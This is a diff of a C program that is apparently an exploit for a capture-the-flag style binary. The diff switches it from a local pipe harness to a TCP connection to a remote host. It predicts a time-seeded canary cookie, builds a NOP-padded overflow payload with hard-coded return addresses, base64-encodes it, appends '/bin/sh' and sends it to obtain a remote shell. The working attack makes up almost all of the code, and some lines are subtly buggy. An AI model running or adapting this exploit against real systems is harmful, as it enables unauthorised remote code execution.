@@ -1,9 +1,13 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <netdb.h>
+#include <netinet/in.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <stdint.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 
 
 static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
@@ -17,6 +21,8 @@ static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
 static char *decoding_table = NULL;
 static int mod_table[] = {0, 2, 1};
 int lenOfb64;
+
+
 
 
 char *base64_encode(const unsigned char *data,
@@ -100,137 +106,96 @@ void p32(char *payload, char *hex, int pos)
   }
 }
 
-int main()
-{
-  time_t t=time(0);
-  char *argv[]={"./hash",(char *) 0};
-  char *envp=NULL;
-  int pc[2];
-  int cp[2];
-  int pid,flag=-2;
+
+int main(int argc, char *argv[]) {
+
+  int flag=-2;
+
   char ch;
   char cookie[15];
   char payload[536],finalPayload[734];
 
-  if (pipe(pc) < 0)
-  {
-    perror("Can't make pipe\n");
-    exit(1);
-  }
-  if (pipe(cp) < 0)
-  {
-    perror("Can't make pipe\n");
-    exit(1);
-  }
+  int clientSocket;
+  char buffer[1024];
+  struct sockaddr_in serverAddr;
+  socklen_t addr_size;
 
-  switch(pid=fork())
-  {
-    case -1:
-      perror("Can't fork\n");
-      exit(1);
-    case 0:
-      /*Child*/
-      close(1);
-      dup(cp[1]);
-      close(0);
-      dup(pc[0]);
+  /*---- Create the socket. The three arguments are: ----*/
+  /* 1) Internet domain 2) Stream socket 3) Default protocol (TCP in this case) */
+  clientSocket = socket(PF_INET, SOCK_STREAM, 0);
 
-      close(pc[1]);
-      close(cp[0]);
+  /*---- Configure settings of the server address struct ----*/
+  /* Address family = Internet */
+  serverAddr.sin_family = AF_INET;
+  /* Set port number, using htons function to use proper byte order */
+  serverAddr.sin_port = htons(9002);
+  /* Set IP address to localhost */
+  serverAddr.sin_addr.s_addr = inet_addr("143.248.249.64");
+  /* Set all bits of the padding field to 0 */
+  memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);
 
-      //printf("seed t : %d",t);
-      execve("./hash",argv,NULL);
-      perror("No exec\n");
-      //signal(getppid(),SIGQUIT);
-      exit(1);
+  /*---- Connect the socket to the server using the address struct ----*/
+  addr_size = sizeof serverAddr;
 
-    default:
-      /*Parent*/
+  connect(clientSocket, (struct sockaddr *) &serverAddr, addr_size);
+  time_t t=time(0)-10.0;
 
-      printf("\nOutput from child:\n");
-      close(cp[1]);
-      char captcha[15];
-      while (read(cp[0],&ch,1) == 1)
-      {
-        write(1,&ch,1);
-        if (ch==':' || flag!=-2)
-        {
-            if (flag>=0)
-            {
-                captcha[flag]=ch;
-            }
-            flag++;
-            if (ch==0xa)
-              break;
-        }
-      }
-      int m=atoi(captcha);
-      int len=sprintf(cookie,"%x",randCalc(t,m));
-      printf("The cookie : %s\n",cookie);
+	char captcha[15];
+   while (read(clientSocket,&ch,1) == 1)
+   {
+     write(1,&ch,1);
+     if (ch==':' || flag!=-2)
+     {
+         if (flag>=0)
+         {
+             captcha[flag]=ch;
+         }
+         flag++;
+         if (ch==0xa)
+           break;
+     }
+   }
 
 
-      memset(payload, 0x90, 536);
-      p32(payload,cookie,512);
-      p32(payload,"08049174",528);
-      p32(payload,"0804b3b6",532);
-
-      printf("lenOfb64 : %p\n", &lenOfb64);
-      char *encdpd=base64_encode(payload,536,&lenOfb64);
-      //printf("Encode payload with length %d: %s\n", lenOfb64, encdpd );
-      memset(finalPayload,0x90,734);
-      strcpy(finalPayload,encdpd);
-      strcpy(finalPayload+726,"/bin/sh");
-      /*printf("finalPayload : ");
-      for (int i=0;i<734;i++)
-        printf("%c",finalPayload[i]);*/
-
-      sprintf(cookie,"%d",m);
-      printf("WTF!!!:%d %d\n",strlen(cookie),strlen(captcha));
-      for (int i=0;i<strlen(captcha);i++)
-        write(pc[1],&cookie[i],1);
-      write(pc[1],"0xa",1);
+   int m=atoi(captcha);
+   int len=sprintf(cookie,"%x",randCalc(t,m));
+   printf("The cookie : %s\n",cookie);
 
 
-      while (read(cp[0],&ch,1) == 1)
-      {
-        write(1,&ch,1);
-        if (ch=='!')
-        {
-          for (int i=0;i<734;i++)
-            write(pc[1],&finalPayload[i],1);
-          write(pc[1],"\n",1);
-          //break;
-        }
-      }
+   memset(payload, 0x90, 536);
+   p32(payload,cookie,512);
+   p32(payload,"08049174",528);
+   p32(payload,"0804b3b6",532);
 
-      //for (int i=0;i<734;i++)
-      //  write(pc[1],&finalPayload[i],1);
+   printf("lenOfb64 : %p\n", &lenOfb64);
+   char *encdpd=base64_encode(payload,536,&lenOfb64);
+   //printf("Encode payload with length %d: %s\n", lenOfb64, encdpd );
+   memset(finalPayload,0x90,734);
+   strcpy(finalPayload,encdpd);
+   strcpy(finalPayload+726,"/bin/sh");
+   /*printf("finalPayload : ");
+   for (int i=0;i<734;i++)
+     printf("%c",finalPayload[i]);*/
 
-
-
-      /*
-      printf("Input to child:\n");
-      while (read(0,&ch,1)>0)
-      {
-        write(pc[1],&ch,1);
-        //write(1,&ch,1);
-      }
-
-      while (read(cp[0],&ch,1)==1)
-      {
-        write(1,&ch,1);
-      }
-      close(pc[1]);
-      */
-      exit(0);
-  }
-
-  //execve("./hash",argv,envp);
-  /*
-  char payload[];
-  memset(payload, 0x90, (512+4+12+4+4));
-  cookie=randCalc(t,m);
-  */
+   sprintf(cookie,"%d",m);
+   printf("WTF!!!:%d %d\n",strlen(cookie),strlen(captcha));
+   for (int i=0;i<strlen(captcha);i++)
+     write(clientSocket,&cookie[i],1);
+   write(clientSocket,"0xa",1);
 
 
+   while (read(clientSocket,&ch,1) == 1)
+   {
+     write(1,&ch,1);
+     if (ch=='!')
+     {
+       for (int i=0;i<734;i++)
+         write(clientSocket,&finalPayload[i],1);
+       write(clientSocket,"\nls",1);
+       //break;
+     }
+   }
+
+  // printf("%s\n",buffer);
+   return 0;
 }
